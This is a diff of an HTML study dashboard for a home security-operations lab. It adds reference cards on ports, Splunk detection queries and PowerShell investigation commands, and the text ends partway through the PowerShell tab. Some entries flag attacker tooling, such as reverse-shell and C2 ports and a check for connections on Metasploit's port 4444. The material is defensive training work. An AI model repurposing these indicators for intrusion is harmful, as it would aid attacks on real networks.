@@ -1,3 +1,4 @@
+
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -487,6 +488,107 @@
     font-weight: 300;
   }
 
+  /* STUDIES & REFERENCE */
+  .study-tab {
+    background: var(--surface);
+    border: 1px solid var(--border);
+    color: var(--text-secondary);
+    padding: 10px 20px;
+    border-radius: 8px;
+    cursor: pointer;
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 13px;
+    transition: all 0.2s;
+  }
+  .study-tab:hover {
+    border-color: var(--accent);
+    color: var(--accent);
+  }
+  .active-tab {
+    background: var(--accent);
+    color: #0a0e1a;
+    border-color: var(--accent);
+    font-weight: 700;
+  }
+  .study-panel { display: block; }
+  .study-grid {
+    display: grid;
+    grid-template-columns: repeat(auto-fill, minmax(380px, 1fr));
+    gap: 20px;
+  }
+  .study-card {
+    background: var(--surface);
+    border: 1px solid var(--border);
+    border-radius: 12px;
+    padding: 20px;
+  }
+  .study-card-title {
+    font-size: 14px;
+    font-weight: 700;
+    color: var(--accent);
+    margin-bottom: 16px;
+    padding-bottom: 8px;
+    border-bottom: 1px solid var(--border);
+    font-family: 'Share Tech Mono', monospace;
+  }
+  .study-item {
+    display: flex;
+    gap: 10px;
+    margin-bottom: 10px;
+    align-items: flex-start;
+    flex-wrap: wrap;
+  }
+  .port-num {
+    background: rgba(0,212,255,0.1);
+    color: var(--accent);
+    padding: 2px 8px;
+    border-radius: 4px;
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 12px;
+    white-space: nowrap;
+    flex-shrink: 0;
+  }
+  .port-proto {
+    background: rgba(123,47,255,0.1);
+    color: #a78bfa;
+    padding: 2px 8px;
+    border-radius: 4px;
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 11px;
+    white-space: nowrap;
+    flex-shrink: 0;
+  }
+  .port-desc {
+    color: var(--text-secondary);
+    font-size: 12px;
+    line-height: 1.5;
+    flex: 1;
+  }
+  .spl-block {
+    background: #0a0e1a;
+    border: 1px solid var(--border);
+    border-left: 3px solid var(--accent);
+    border-radius: 6px;
+    padding: 10px 14px;
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 11px;
+    color: #00ff9d;
+    margin-bottom: 6px;
+    word-break: break-all;
+    cursor: pointer;
+    transition: border-color 0.2s;
+  }
+  .spl-block:hover {
+    border-left-color: #7b2fff;
+  }
+  .spl-desc {
+    color: var(--text-secondary);
+    font-size: 12px;
+    line-height: 1.5;
+    margin-bottom: 14px;
+    padding-left: 4px;
+  }
+
   /* FOOTER */
   footer {
     margin-top: 60px;
@@ -633,6 +735,20 @@
       <div class="card-desc">Check whether an IP address has been reported for abuse, spam, or malicious activity. Cross-reference with VirusTotal for complete IP reputation picture.</div>
       <div class="card-tags">
         <span class="tag">IP</span><span class="tag">ABUSE</span><span class="tag">REPUTATION</span><span class="tag">REPORTING</span>
+      </div>
+      <div class="card-arrow">→</div>
+    </a>
+
+    <a href="https://talosintelligence.com" target="_blank" class="tool-card cat-threat" data-category="threat" data-tags="cisco talos ip domain reputation threat intelligence file hash blacklist">
+      <div class="card-top">
+        <div class="card-icon">🛡️</div>
+        <div class="card-badge">CISCO TALOS</div>
+      </div>
+      <div class="card-name">Cisco Talos Intelligence</div>
+      <div class="card-url">talosintelligence.com</div>
+      <div class="card-desc">One of the largest commercial threat intelligence teams. Look up IP and domain reputation, file hashes, vulnerability research, and blacklist status. Backed by Cisco's global threat visibility.</div>
+      <div class="card-tags">
+        <span class="tag">IP</span><span class="tag">DOMAIN</span><span class="tag">REPUTATION</span><span class="tag">HASH</span><span class="tag">CISCO</span>
       </div>
       <div class="card-arrow">→</div>
     </a>
@@ -1011,87 +1127,6 @@
 
   </div>
 
-  <!-- QUICK REFERENCE PANEL -->
-  <div class="section-header">
-    <span class="section-label"><span class="section-accent">07 //</span> QUICK REFERENCE</span>
-    <div class="section-line"></div>
-  </div>
-
-  <div class="quick-ref">
-    <div class="ref-grid">
-
-      <div class="ref-group">
-        <h4>KEY EVENT IDs</h4>
-        <div class="ref-item"><span class="ref-id">4624</span><span class="ref-desc">Successful logon</span></div>
-        <div class="ref-item"><span class="ref-id">4625</span><span class="ref-desc">Failed logon</span></div>
-        <div class="ref-item"><span class="ref-id">4648</span><span class="ref-desc">Explicit credential logon</span></div>
-        <div class="ref-item"><span class="ref-id">4672</span><span class="ref-desc">Special privileges assigned</span></div>
-        <div class="ref-item"><span class="ref-id">4720</span><span class="ref-desc">User account created</span></div>
-        <div class="ref-item"><span class="ref-id">4722</span><span class="ref-desc">Account enabled</span></div>
-        <div class="ref-item"><span class="ref-id">4732</span><span class="ref-desc">Added to security group</span></div>
-        <div class="ref-item"><span class="ref-id">4740</span><span class="ref-desc">Account lockout</span></div>
-        <div class="ref-item"><span class="ref-id">7036</span><span class="ref-desc">Service started/stopped</span></div>
-      </div>
-
-      <div class="ref-group">
-        <h4>LOGON TYPES</h4>
-        <div class="ref-item"><span class="ref-id">Type 2</span><span class="ref-desc">Interactive (console)</span></div>
-        <div class="ref-item"><span class="ref-id">Type 3</span><span class="ref-desc">Network (SMB)</span></div>
-        <div class="ref-item"><span class="ref-id">Type 4</span><span class="ref-desc">Batch</span></div>
-        <div class="ref-item"><span class="ref-id">Type 5</span><span class="ref-desc">Service account</span></div>
-        <div class="ref-item"><span class="ref-id">Type 7</span><span class="ref-desc">Unlock</span></div>
-        <div class="ref-item"><span class="ref-id">Type 8</span><span class="ref-desc">NetworkCleartext</span></div>
-        <div class="ref-item"><span class="ref-id">Type 10</span><span class="ref-desc">RemoteInteractive (RDP)</span></div>
-        <div class="ref-item"><span class="ref-id">Type 11</span><span class="ref-desc">CachedInteractive</span></div>
-      </div>
-
-      <div class="ref-group">
-        <h4>SPLUNK SEARCHES</h4>
-        <div class="ref-item"><span class="ref-id" style="font-size:9px">4625 all</span><span class="ref-desc">Failed logins</span></div>
-        <div class="ref-item"><span class="ref-id" style="font-size:9px">by acct</span><span class="ref-desc">Target account</span></div>
-        <div class="ref-item"><span class="ref-id" style="font-size:9px">by src_ip</span><span class="ref-desc">Attacker IP</span></div>
-        <div class="ref-item"><span class="ref-id" style="font-size:9px">timechart</span><span class="ref-desc">Attack timeline</span></div>
-        <div class="ref-item"><span class="ref-id" style="font-size:9px">4624 check</span><span class="ref-desc">Success after fail</span></div>
-        <div class="ref-item"><span class="ref-id" style="font-size:9px">4740</span><span class="ref-desc">Account lockout</span></div>
-      </div>
-
-      <div class="ref-group">
-        <h4>PHISHING IOCs</h4>
-        <div class="ref-item"><span class="ref-id" style="font-size:9px">SPF</span><span class="ref-desc">Email auth result</span></div>
-        <div class="ref-item"><span class="ref-id" style="font-size:9px">DKIM</span><span class="ref-desc">Signature valid?</span></div>
-        <div class="ref-item"><span class="ref-id" style="font-size:9px">Received</span><span class="ref-desc">Origin IP in headers</span></div>
-        <div class="ref-item"><span class="ref-id" style="font-size:9px">Reply-To</span><span class="ref-desc">Real reply address</span></div>
-        <div class="ref-item"><span class="ref-id" style="font-size:9px">Unicode</span><span class="ref-desc">Filter evasion chars</span></div>
-        <div class="ref-item"><span class="ref-id" style="font-size:9px">onmicrosoft</span><span class="ref-desc">Throwaway M365</span></div>
-        <div class="ref-item"><span class="ref-id" style="font-size:9px">TOAD</span><span class="ref-desc">Callback phishing</span></div>
-      </div>
-
-      <div class="ref-group">
-        <h4>IR FRAMEWORKS</h4>
-        <div class="ref-item"><span class="ref-id" style="font-size:9px">P</span><span class="ref-desc">Preparation</span></div>
-        <div class="ref-item"><span class="ref-id" style="font-size:9px">I</span><span class="ref-desc">Identification</span></div>
-        <div class="ref-item"><span class="ref-id" style="font-size:9px">C</span><span class="ref-desc">Containment</span></div>
-        <div class="ref-item"><span class="ref-id" style="font-size:9px">E</span><span class="ref-desc">Eradication</span></div>
-        <div class="ref-item"><span class="ref-id" style="font-size:9px">R</span><span class="ref-desc">Recovery</span></div>
-        <div class="ref-item"><span class="ref-id" style="font-size:9px">L</span><span class="ref-desc">Lessons Learned</span></div>
-        <div class="ref-item" style="margin-top:6px"><span class="ref-id" style="font-size:9px; color: var(--muted);">SANS</span><span class="ref-desc">PICERL above</span></div>
-        <div class="ref-item"><span class="ref-id" style="font-size:9px; color: var(--muted);">NIST</span><span class="ref-desc">Prepare/Detect/Respond</span></div>
-      </div>
-
-      <div class="ref-group">
-        <h4>LAB NETWORK</h4>
-        <div class="ref-item"><span class="ref-id" style="font-size:9px">SIEM</span><span class="ref-desc">Ubuntu Server</span></div>
-        <div class="ref-item"><span class="ref-id" style="font-size:9px">DC</span><span class="ref-desc">Windows Server 2019</span></div>
-        <div class="ref-item"><span class="ref-id" style="font-size:9px">CLIENT</span><span class="ref-desc">Windows 11</span></div>
-        <div class="ref-item"><span class="ref-id" style="font-size:9px">Splunk</span><span class="ref-desc">Web UI :8000</span></div>
-        <div class="ref-item"><span class="ref-id" style="font-size:9px">Forwarder</span><span class="ref-desc">Receiver :9997</span></div>
-        <div class="ref-item"><span class="ref-id" style="font-size:9px">Network</span><span class="ref-desc">VMware Isolated</span></div>
-        <div class="ref-item"><span class="ref-id" style="font-size:9px">Attack</span><span class="ref-desc">Kali Linux</span></div>
-      </div>
-
-    </div>
-  </div>
-
   <!-- BLUE VS RED TEAM REFERENCE -->
   <div class="section-header">
     <span class="section-label"><span class="section-accent">08 //</span> BLUE TEAM VS RED TEAM TOOLS</span>
@@ -1171,6 +1206,894 @@
 
   </div>
 
+  <!-- STUDIES & REFERENCE SECTION -->
+  <div class="container" style="margin-top:40px;">
+    <div class="section-header" style="display:flex;align-items:center;gap:16px;margin-bottom:24px;">
+      <div style="width:4px;height:40px;background:linear-gradient(180deg,#00d4ff,#7b2fff);border-radius:2px;"></div>
+      <div>
+        <div style="font-size:11px;letter-spacing:3px;color:#7b2fff;font-weight:700;margin-bottom:4px;">QUICK REFERENCE</div>
+        <div style="font-size:22px;font-weight:800;color:#e2e8f0;letter-spacing:1px;">STUDIES & REFERENCE</div>
+      </div>
+    </div>
+
+    <!-- Tab Navigation -->
+    <div style="display:flex;gap:8px;margin-bottom:24px;flex-wrap:wrap;">
+      <button onclick="showStudyTab('ports')" id="tab-ports" class="study-tab active-tab">⚡ Ports & Protocols</button>
+      <button onclick="showStudyTab('splunk')" id="tab-splunk" class="study-tab">🔍 Splunk SPL</button>
+      <button onclick="showStudyTab('powershell')" id="tab-powershell" class="study-tab">💻 PowerShell</button>
+      <button onclick="showStudyTab('linux')" id="tab-linux" class="study-tab">🐧 Linux CLI</button>
+      <button onclick="showStudyTab('kali')" id="tab-kali" class="study-tab">☠️ Kali Linux</button>
+      <button onclick="showStudyTab('eventids')" id="tab-eventids" class="study-tab">📋 Event IDs</button>
+      <button onclick="showStudyTab('ir')" id="tab-ir" class="study-tab">🚨 IR & Phishing</button>
+      <button onclick="showStudyTab('logaware')" id="tab-logaware" class="study-tab">👁️ Log Awareness</button>
+      <button onclick="showStudyTab('malicious')" id="tab-malicious" class="study-tab">☣️ Malicious Files</button>
+      <button onclick="showStudyTab('troubleshoot')" id="tab-troubleshoot" class="study-tab">🛠️ Troubleshooting</button>
+    </div>
+
+    <!-- PORTS & PROTOCOLS TAB -->
+    <div id="study-ports" class="study-panel">
+      <div class="study-grid">
+        <div class="study-card">
+          <div class="study-card-title">🌐 Web & HTTP</div>
+          <div class="study-item"><span class="port-num">80</span><span class="port-proto">TCP</span><span class="port-desc">HTTP — Unencrypted web traffic. Should see HTTPS instead in modern environments. Suspicious if internal hosts communicate outbound on port 80.</span></div>
+          <div class="study-item"><span class="port-num">443</span><span class="port-proto">TCP</span><span class="port-desc">HTTPS — Encrypted web traffic. Standard for all modern web browsing. Malware often uses 443 to blend in with normal traffic.</span></div>
+          <div class="study-item"><span class="port-num">8080</span><span class="port-proto">TCP</span><span class="port-desc">Alternate HTTP — Often used by web proxies and dev servers. Also commonly used by attackers for reverse shells and C2 communication.</span></div>
+          <div class="study-item"><span class="port-num">8443</span><span class="port-proto">TCP</span><span class="port-desc">Alternate HTTPS — Secondary secure web port. Used by some admin panels and applications.</span></div>
+        </div>
+        <div class="study-card">
+          <div class="study-card-title">📁 File Transfer & Remote</div>
+          <div class="study-item"><span class="port-num">21</span><span class="port-proto">TCP</span><span class="port-desc">FTP — File Transfer Protocol. Unencrypted. Legacy protocol. Suspicious if seen on modern networks — could indicate data exfiltration.</span></div>
+          <div class="study-item"><span class="port-num">22</span><span class="port-proto">TCP</span><span class="port-desc">SSH — Secure Shell. Encrypted remote access to Linux/Unix systems. Brute force attacks commonly target port 22.</span></div>
+          <div class="study-item"><span class="port-num">23</span><span class="port-proto">TCP</span><span class="port-desc">Telnet — Unencrypted remote access. Should never be seen on modern networks. Immediate red flag if detected.</span></div>
+          <div class="study-item"><span class="port-num">3389</span><span class="port-proto">TCP</span><span class="port-desc">RDP — Remote Desktop Protocol. Windows remote access. High value target for attackers. Brute force and exploitation common. Should never be exposed to internet.</span></div>
+        </div>
+        <div class="study-card">
+          <div class="study-card-title">📧 Email Protocols</div>
+          <div class="study-item"><span class="port-num">25</span><span class="port-proto">TCP</span><span class="port-desc">SMTP — Email sending between servers. Should only be used by mail servers. Workstations communicating on 25 is suspicious — possible spam bot.</span></div>
+          <div class="study-item"><span class="port-num">110</span><span class="port-proto">TCP</span><span class="port-desc">POP3 — Email retrieval. Unencrypted. Legacy protocol. Replaced by IMAP and IMAP over SSL.</span></div>
+          <div class="study-item"><span class="port-num">143</span><span class="port-proto">TCP</span><span class="port-desc">IMAP — Email retrieval. Allows email to stay on server. More modern than POP3.</span></div>
+          <div class="study-item"><span class="port-num">465/587</span><span class="port-proto">TCP</span><span class="port-desc">SMTPS — Encrypted email submission. Used by email clients to send mail. 587 is preferred modern standard.</span></div>
+        </div>
+        <div class="study-card">
+          <div class="study-card-title">🔧 Network Services</div>
+          <div class="study-item"><span class="port-num">53</span><span class="port-proto">TCP/UDP</span><span class="port-desc">DNS — Domain Name System. Translates domain names to IPs. DNS tunneling used by attackers to exfiltrate data. Large DNS queries are suspicious.</span></div>
+          <div class="study-item"><span class="port-num">67/68</span><span class="port-proto">UDP</span><span class="port-desc">DHCP — Assigns IP addresses automatically. Port 67 server, 68 client. APIPA (169.254.x.x) appears when DHCP fails.</span></div>
+          <div class="study-item"><span class="port-num">123</span><span class="port-proto">UDP</span><span class="port-desc">NTP — Network Time Protocol. Keeps clocks synchronized. Important for log correlation — time must be accurate across all systems.</span></div>
+          <div class="study-item"><span class="port-num">161/162</span><span class="port-proto">UDP</span><span class="port-desc">SNMP — Network device monitoring. Old versions have weak security. Used to manage routers, switches, printers.</span></div>
+        </div>
+        <div class="study-card">
+          <div class="study-card-title">🪟 Windows Specific</div>
+          <div class="study-item"><span class="port-num">135</span><span class="port-proto">TCP</span><span class="port-desc">RPC — Remote Procedure Call. Windows service communication. Used by many Windows services and WMI. Targeted by several exploits.</span></div>
+          <div class="study-item"><span class="port-num">139</span><span class="port-proto">TCP</span><span class="port-desc">NetBIOS — Legacy Windows networking. Should be disabled on modern networks. Part of what was targeted by EternalBlue/WannaCry.</span></div>
+          <div class="study-item"><span class="port-num">445</span><span class="port-proto">TCP</span><span class="port-desc">SMB — Server Message Block. Windows file sharing. EternalBlue exploit targeted this port. Should never be exposed to internet. Disable if not needed.</span></div>
+          <div class="study-item"><span class="port-num">389/636</span><span class="port-proto">TCP</span><span class="port-desc">LDAP/LDAPS — Active Directory communication. 389 unencrypted, 636 encrypted. Used for AD authentication and queries.</span></div>
+        </div>
+        <div class="study-card">
+          <div class="study-card-title">⚠️ Common Attack Ports</div>
+          <div class="study-item"><span class="port-num">4444</span><span class="port-proto">TCP</span><span class="port-desc">Metasploit default — Default reverse shell port for Metasploit framework. Immediate red flag if seen in network traffic.</span></div>
+          <div class="study-item"><span class="port-num">1234</span><span class="port-proto">TCP</span><span class="port-desc">Common reverse shell — Frequently used by attackers for reverse shell callbacks. Always investigate outbound connections on this port.</span></div>
+          <div class="study-item"><span class="port-num">9001</span><span class="port-proto">TCP</span><span class="port-desc">Tor — Default Tor network port. Could indicate anonymization attempts or C2 over Tor.</span></div>
+          <div class="study-item"><span class="port-num">6667</span><span class="port-proto">TCP</span><span class="port-desc">IRC — Internet Relay Chat. Old protocol still used by some botnets for C2 communication. Suspicious on corporate networks.</span></div>
+        </div>
+      </div>
+    </div>
+
+    <!-- SPLUNK SPL TAB -->
+    <div id="study-splunk" class="study-panel" style="display:none;">
+      <div style="background:rgba(0,212,255,0.05);border:1px solid rgba(0,212,255,0.2);border-radius:8px;padding:16px;margin-bottom:20px;">
+        <div style="color:#00d4ff;font-family:'Share Tech Mono',monospace;font-size:12px;font-weight:700;margin-bottom:8px;">📌 HOW TO USE THESE QUERIES</div>
+        <div style="color:#8899aa;font-size:12px;line-height:1.7;">
+          Copy any green query into the Splunk search bar at <span style="color:#00ff9d;">http://192.168.15.128:8000</span> exactly as shown.<br>
+          <strong style="color:#e2e8f0;">Field names like Account_Name, ComputerName, Source_Network_Address are automatically filled by Splunk</strong> — they are column headers that pull real values from your logs.<br>
+          Example: Account_Name shows actual usernames like <span style="color:#00ff9d;">testuser01</span> or <span style="color:#00ff9d;">Administrator</span>. ComputerName shows <span style="color:#00ff9d;">CLIENT01</span> or <span style="color:#00ff9d;">FETT</span>.
+        </div>
+      </div>
+      <div class="study-grid">
+        <div class="study-card">
+          <div class="study-card-title">🚨 Brute Force Detection</div>
+          <div class="spl-block">index=main EventCode=4625<br>| stats count by Account_Name<br>| sort -count</div>
+          <div class="spl-desc">Count failed logins by account. High counts indicate brute force targeting specific accounts.</div>
+          <div class="spl-block">index=main EventCode=4625<br>| bucket _time span=1m<br>| stats count by _time Account_Name<br>| where count > 5</div>
+          <div class="spl-desc">Find accounts with more than 5 failed logins per minute — real-time brute force indicator.</div>
+          <div class="spl-block">index=main EventCode=4625<br>| stats count by Source_Network_Address<br>| sort -count</div>
+          <div class="spl-desc">Find which IP addresses are generating failed logins — identify attack source.</div>
+        </div>
+        <div class="study-card">
+          <div class="study-card-title">👤 Account Activity</div>
+          <div class="spl-block">index=main EventCode=4720<br>| table _time Account_Name<br>Subject_Account_Name ComputerName</div>
+          <div class="spl-desc">Show all new user accounts created. Who created them and when.</div>
+          <div class="spl-block">index=main host=FETT EventCode=4624<br>| stats count by Account_Name<br>| sort -count</div>
+          <div class="spl-desc">Count successful logons by account on FETT DC. Shows all accounts including computer accounts (FETT$, CLIENT01$) and users. To find a specific user use: index=main "username" EventCode=4624 | table _time host Account_Name — searching raw text works better than field filtering on FETT due to dual Account_Name values.</div>
+          <div class="spl-block">index=main "j.doe" EventCode=4624<br>| table _time host Account_Name<br>| sort -_time</div>
+          <div class="spl-desc">Find specific user logon events across all hosts. Searching raw text finds events on both CLIENT01 and FETT. Replace j.doe with any username. Always remove host= filter when searching for domain user events.</div>
+          <div class="spl-block">index=main EventCode=4740<br>| table _time Account_Name<br>Subject_Account_Name ComputerName</div>
+          <div class="spl-desc">Account lockouts — often follow a brute force attack. Cross reference with 4625 events.</div>
+        </div>
+        <div class="study-card">
+          <div class="study-card-title">⚙️ Process & Service</div>
+          <div class="spl-block">index=main EventCode=4688<br>| table _time Account_Name<br>New_Process_Name Creator_Process_Name</div>
+          <div class="spl-desc">New processes created. Check parent process — malware often spawns from unexpected parents like Word or Excel.</div>
+          <div class="spl-block">index=main EventCode=7045<br>| table _time ServiceName<br>ServiceFileName StartType</div>
+          <div class="spl-desc">New services installed. Malware frequently installs itself as a Windows service for persistence.</div>
+          <div class="spl-block">index=main host=FETT EventCode=7036<br>| table _time Message ComputerName<br>| sort -_time</div>
+          <div class="spl-desc">Service started or stopped on FETT Server 2019. Uses Message field — ServiceName field is not populated in this lab. Example: search Message="*Print Spooler*" to isolate specific service. Windows 11 does NOT reliably generate 7036 — use Application log Event ID 1013/1003 for Windows Search on CLIENT01.</div>
+        </div>
+        <div class="study-card">
+          <div class="study-card-title">🔑 Privilege & Policy</div>
+          <div class="spl-block">index=main host=FETT EventCode=4728<br>| table _time Account_Name<br>Group_Name Subject_Account_Name<br>| sort -_time</div>
+          <div class="spl-desc">Users added to GLOBAL security groups on FETT DC — correct Event ID for your lab. Example: j.doe and soc.analyst added to SOC_Analysts group. Use 4732 for Local groups, 4756 for Universal groups.</div>
+          <div class="spl-block">index=main host=FETT EventCode=4732<br>| table _time Account_Name<br>Group_Name Subject_Account_Name<br>| sort -_time</div>
+          <div class="spl-desc">Users added to LOCAL security groups. Use this if group scope is Domain Local. Always check group scope in AD before deciding which Event ID to search for.</div>
+          <div class="spl-block">index=main host=FETT EventCode=4672<br>| table _time Account_Name<br>Privileges ComputerName<br>| sort -_time</div>
+          <div class="spl-desc">Special privileges assigned at logon. Fires every time a domain admin logs in. Monitor for unexpected accounts receiving admin privileges.</div>
+          <div class="spl-block">index=main host=FETT EventCode=4719<br>| table _time SubjectUserName<br>AuditPolicyChanges ComputerName<br>| sort -_time</div>
+          <div class="spl-desc">Audit policy changes on DC. Attackers disable logging to cover tracks. Always alert on this immediately.</div>
+        </div>
+        <div class="study-card">
+          <div class="study-card-title">📊 Useful SPL Operators</div>
+          <div class="spl-block">| stats count by FieldName</div>
+          <div class="spl-desc">Count events grouped by a field value.</div>
+          <div class="spl-block">| table _time Field1 Field2 Field3</div>
+          <div class="spl-desc">Display specific fields in a clean table format.</div>
+          <div class="spl-block">| sort -count</div>
+          <div class="spl-desc">Sort results highest to lowest by count field.</div>
+          <div class="spl-block">| where count > 10</div>
+          <div class="spl-desc">Filter results where count exceeds a threshold.</div>
+          <div class="spl-block">| rex field=_raw "(?&lt;ip&gt;\d+\.\d+\.\d+\.\d+)"</div>
+          <div class="spl-desc">Extract IP addresses from raw log data using regex.</div>
+        </div>
+        <div class="study-card">
+          <div class="study-card-title">🛡️ Security & Malware</div>
+          <div class="spl-block">index=main EventCode=1116<br>| table _time ThreatName<br>Path ActionSuccess ComputerName</div>
+          <div class="spl-desc">Windows Defender malware detections. What was found, where, and was it remediated.</div>
+          <div class="spl-block">index=main EventCode=4625<br>Logon_Type=10<br>| stats count by Source_Network_Address</div>
+          <div class="spl-desc">Failed RDP logon attempts by source IP. Common RDP brute force detection query.</div>
+          <div class="spl-block">index=main EventCode=4688<br>New_Process_Name="*powershell*"<br>| table _time Account_Name CommandLine</div>
+          <div class="spl-desc">PowerShell execution events. Suspicious PowerShell often used in fileless malware attacks.</div>
+        </div>
+        <div class="study-card">
+          <div class="study-card-title">🔧 Splunk Troubleshooting</div>
+          <div class="spl-block">index=main<br>| stats count by host</div>
+          <div class="spl-desc">FIRST CHECK — verify which hosts are sending logs. If CLIENT01 or FETT missing, forwarder may be stopped. Run on host: Get-Service SplunkForwarder to check status.</div>
+          <div class="spl-block">index=main host=FETT<br>| stats count by sourcetype</div>
+          <div class="spl-desc">Verify which log types are being collected from FETT. Should show WinEventLog:Security, WinEventLog:System, WinEventLog:Application. Missing sourcetype means inputs.conf needs updating.</div>
+          <div class="spl-block">index=main host=FETT<br>| sort -_time<br>| head 1<br>| table _time host sourcetype</div>
+          <div class="spl-desc">Check timestamp of most recent event from FETT. If timestamp is hours old the forwarder stopped sending. Restart with: Restart-Service SplunkForwarder on FETT.</div>
+          <div class="spl-block">index=main EventCode=4624<br>| stats count by Account_Name<br>| sort -count</div>
+          <div class="spl-desc">When Account_Name filter returns nothing — run stats first to see exact format Splunk stored the username. Then copy exact value into your filter. Field values are case sensitive in Splunk filters.</div>
+          <div class="spl-block">index=main "searchterm"<br>| table _time host _raw<br>| sort -_time</div>
+          <div class="spl-desc">When field filters fail — search raw text in quotes. Example: index=main "j.doe" finds any event containing j.doe regardless of which field it is in. Always broaden search before narrowing.</div>
+          <div class="spl-block">index=main host=FETT EventCode=4728<br>| table _time _raw<br>| sort -_time</div>
+          <div class="spl-desc">When table query returns 0 results — remove table command and view raw events first. Click any event to see actual field names on left panel. Then rebuild table using correct field names from raw event.</div>
+        </div>
+      </div>
+    </div>
+    <div id="study-powershell" class="study-panel" style="display:none;">
+      <div class="study-grid">
+        <div class="study-card">
+          <div class="study-card-title">📋 Event Log Queries</div>
+          <div class="spl-block">Get-WinEvent -LogName Security -MaxEvents 50 | Where-Object {$_.Id -eq 4625} | Format-List</div>
+          <div class="spl-desc">Get last 50 failed login events from Security log.</div>
+          <div class="spl-block">Get-WinEvent -FilterHashtable @{LogName='Security';Id=4720} | Select-Object TimeCreated,Message</div>
+          <div class="spl-desc">Get all user account creation events with timestamp and details.</div>
+          <div class="spl-block">Get-EventLog -LogName System -EntryType Error -Newest 20</div>
+          <div class="spl-desc">Get last 20 system errors from System event log.</div>
+        </div>
+        <div class="study-card">
+          <div class="study-card-title">🔧 Service Management</div>
+          <div class="spl-block">Get-Service | Where-Object {$_.Status -eq 'Running'}</div>
+          <div class="spl-desc">List all currently running services on the system.</div>
+          <div class="spl-block">Stop-Service -Name "ServiceName" -Force</div>
+          <div class="spl-desc">Stop a specific service by name. Force stops dependent services.</div>
+          <div class="spl-block">Set-Service -Name "ServiceName" -StartupType Disabled</div>
+          <div class="spl-desc">Disable a service so it does not start automatically on boot.</div>
+          <div class="spl-block">Get-Service -Name "Huntress*"</div>
+          <div class="spl-desc">Find services matching a name pattern. Useful for checking if Huntress agent is running.</div>
+        </div>
+        <div class="study-card">
+          <div class="study-card-title">🌐 Network Commands</div>
+          <div class="spl-block">Get-NetTCPConnection | Where-Object {$_.State -eq 'Established'} | Select-Object LocalAddress,LocalPort,RemoteAddress,RemotePort</div>
+          <div class="spl-desc">Show all established TCP connections with local and remote addresses and ports.</div>
+          <div class="spl-block">Get-NetTCPConnection | Where-Object {$_.RemotePort -eq 4444}</div>
+          <div class="spl-desc">Find any connections to suspicious port 4444 — Metasploit default.</div>
+          <div class="spl-block">Resolve-DnsName google.com</div>
+          <div class="spl-desc">DNS lookup for a domain. Verify DNS is resolving correctly.</div>
+          <div class="spl-block">Test-NetConnection -ComputerName 8.8.8.8 -Port 53</div>
+          <div class="spl-desc">Test network connectivity to specific host and port. Useful for firewall troubleshooting.</div>
+        </div>
+        <div class="study-card">
+          <div class="study-card-title">👤 User & Account</div>
+          <div class="spl-block">Get-LocalUser | Select-Object Name,Enabled,LastLogon</div>
+          <div class="spl-desc">List all local user accounts with enabled status and last login time.</div>
+          <div class="spl-block">Get-LocalGroupMember -Group "Administrators"</div>
+          <div class="spl-desc">List all members of the local Administrators group. Check for unauthorized admin accounts.</div>
+          <div class="spl-block">New-LocalUser -Name "testuser" -Password (ConvertTo-SecureString "Pass@123" -AsPlainText -Force)</div>
+          <div class="spl-desc">Create a new local user account. Used in lab exercises to generate Event ID 4720.</div>
+          <div class="spl-block">Disable-LocalUser -Name "testuser"</div>
+          <div class="spl-desc">Disable a local user account without deleting it.</div>
+        </div>
+        <div class="study-card">
+          <div class="study-card-title">🔍 Process Investigation</div>
+          <div class="spl-block">Get-Process | Sort-Object CPU -Descending | Select-Object -First 10</div>
+          <div class="spl-desc">Show top 10 processes by CPU usage. Useful for finding resource intensive or suspicious processes.</div>
+          <div class="spl-block">Get-Process -Name "powershell" | Select-Object Id,Name,Path,StartTime</div>
+          <div class="spl-desc">Get details about specific process including file path and start time.</div>
+          <div class="spl-block">Get-WmiObject Win32_Process | Select-Object Name,ProcessId,ParentProcessId,CommandLine</div>
+          <div class="spl-desc">List all processes with parent process ID and command line — useful for identifying suspicious process chains.</div>
+        </div>
+        <div class="study-card">
+          <div class="study-card-title">🛡️ Security & Hardening</div>
+          <div class="spl-block">Get-MpComputerStatus | Select-Object AMRunningMode,RealTimeProtectionEnabled,AntivirusEnabled</div>
+          <div class="spl-desc">Check Windows Defender status — is real time protection running.</div>
+          <div class="spl-block">Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled True</div>
+          <div class="spl-desc">Enable Windows Firewall on all profiles.</div>
+          <div class="spl-block">Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Run</div>
+          <div class="spl-desc">Check Run registry key for startup programs — common malware persistence location.</div>
+          <div class="spl-block">Disable-WindowsOptionalFeature -Online -FeatureName SMB1Protocol</div>
+          <div class="spl-desc">Disable SMBv1 — legacy protocol targeted by EternalBlue/WannaCry. Should be disabled on all modern systems.</div>
+        </div>
+        <div class="study-card">
+          <div class="study-card-title">🔧 PowerShell Troubleshooting</div>
+          <div class="spl-block">Get-ExecutionPolicy</div>
+          <div class="spl-desc">Check if PowerShell scripts are allowed to run. If returns Restricted — scripts blocked. Fix with: Set-ExecutionPolicy RemoteSigned -Scope CurrentUser. Required before running .ps1 scripts in lab.</div>
+          <div class="spl-block">Set-ExecutionPolicy RemoteSigned -Scope CurrentUser</div>
+          <div class="spl-desc">Allow locally created scripts to run. RemoteSigned means local scripts run freely, downloaded scripts need a signature. Use this when PowerShell blocks your lab scripts.</div>
+          <div class="spl-block">Get-Service SplunkForwarder | Select-Object Status,StartType</div>
+          <div class="spl-desc">Check Splunk Universal Forwarder status on CLIENT01 or FETT. If Stopped — run: Start-Service SplunkForwarder. If StartType is Disabled — run: Set-Service SplunkForwarder -StartupType Automatic first.</div>
+          <div class="spl-block">Restart-Service SplunkForwarder -Force</div>
+          <div class="spl-desc">Restart Splunk forwarder when logs stop appearing in Splunk. Run on CLIENT01 or FETT. After restart wait 60 seconds then verify events appear in Splunk.</div>
+          <div class="spl-block">Test-NetConnection -ComputerName 192.168.15.128 -Port 9997</div>
+          <div class="spl-desc">Test if Splunk forwarder can reach SIEM on port 9997. TcpTestSucceeded: True means connectivity is good. False means network or firewall issue blocking forwarder communication.</div>
+          <div class="spl-block">Get-WinEvent -ListLog * | Where-Object {$_.RecordCount -gt 0} | Select-Object LogName,RecordCount</div>
